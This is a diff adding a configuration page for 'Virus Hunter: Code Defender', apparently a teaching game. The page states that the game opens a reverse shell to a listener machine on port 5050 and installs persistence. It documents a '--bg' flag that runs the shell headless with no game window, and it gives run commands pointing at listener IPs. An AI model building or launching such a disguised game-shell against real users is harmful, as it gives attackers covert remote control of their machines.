@@ -1,0 +1,124 @@
+---
+title: 'Configuration'
+description: 'Command-line arguments, network settings, and gameplay constants for Virus Hunter: Code Defender.'
+keywords: ['configuration', 'CLI', 'arguments', 'network', 'host', 'port', 'gameplay', 'constants']
+---
+
+## Command-line arguments
+
+All arguments are passed to `game/main_game.py`.
+
+| Argument | Default | Description |
+|---|---|---|
+| `--windowed` | *(fullscreen)* | Run in a 1200×800 window instead of fullscreen. |
+| `--host <IP>` | `10.12.73.251` | IP address of the listener machine. |
+| `--bg` | *(disabled)* | Background mode — launches a headless reverse shell with no pygame window. |
+
+### Examples
+
+```bash
+# Run in a window
+python game/main_game.py --windowed
+
+# Point at a different listener host
+python game/main_game.py --host 192.168.56.1
+
+# Headless shell only (no game UI)
+python game/main_game.py --bg --host 192.168.56.1
+```
+
+## Network configuration
+
+| Setting | Value |
+|---|---|
+| Default listener IP | `10.12.73.251` |
+| Default port | `5050` (hardcoded in `ReverseShell.__init__`) |
+| Connection timeout | `5.0` seconds (`socket.settimeout(5.0)`) |
+| Retry delay on failure | `2` seconds |
+| Heartbeat interval | `15` seconds |
+
+### How to change the listener IP
+
+<Steps>
+  <Step title="Find your listener machine's IP">
+    On the machine running `tools/listener.py`, run:
+
+    <Tabs>
+      <Tab title="Linux / macOS">
+        ```bash
+        ip addr show
+        # or
+        ifconfig
+        ```
+      </Tab>
+      <Tab title="Windows">
+        ```bash
+        ipconfig
+        ```
+      </Tab>
+    </Tabs>
+
+    Note the IP on the interface shared with the game VM (typically a host-only adapter).
+  </Step>
+  <Step title="Pass the IP to the game">
+    ```bash
+    python game/main_game.py --host 192.168.56.1
+    ```
+
+    The game connects to `192.168.56.1:5050`.
+  </Step>
+</Steps>
+
+<Info>
+The port `5050` cannot be changed via a CLI flag — it is hardcoded in `ReverseShell.__init__`. To use a different port you would need to edit the source directly and update `tools/listener.py` to match.
+</Info>
+
+## Background mode
+
+Passing `--bg` skips all pygame initialization and launches only the reverse shell component. The game connects to the listener and provides a fully functional shell, but no game window appears. This is useful for:
+
+- Demonstrating the shell mechanism without running the full game.
+- Automated lab exercises where the UI is not needed.
+
+<Warning>
+Background mode still establishes a real reverse shell and installs persistence. All the same safety precautions apply. See [Lab Environment](/safety/lab-environment).
+</Warning>
+
+## Gameplay constants reference
+
+These values are defined in the game source and control the feel and difficulty of each session.
+
+<CardGroup cols={2}>
+  <Card title="Player" icon="user">
+    | Constant | Value |
+    |---|---|
+    | Movement speed | 6 px/frame |
+    | Starting health | 100 HP |
+    | Damage per enemy collision | 15 HP |
+  </Card>
+  <Card title="Enemies" icon="bug">
+    | Constant | Value |
+    |---|---|
+    | Max enemies — Level 1 | 6 (8% spawn chance) |
+    | Max enemies — Level 4 | 8 (5% spawn chance) |
+  </Card>
+  <Card title="Screen shake" icon="zap">
+    | Event | Shake magnitude |
+    |---|---|
+    | Bullet fired | 5 |
+    | Enemy killed | 10 |
+    | Player damaged | 20 |
+  </Card>
+  <Card title="Levels & scanning" icon="layers">
+    | Constant | Value |
+    |---|---|
+    | Terminal interaction range | 80 px |
+    | Level 1 scan speed | 1.2/frame |
+    | Level 4 scan speed | 0.4/frame |
+    | Target FPS | 60 |
+  </Card>
+</CardGroup>
+
+<Note>
+Scan speed decreases with level number — higher levels require you to hold position near terminals for longer, increasing difficulty.
+</Note>
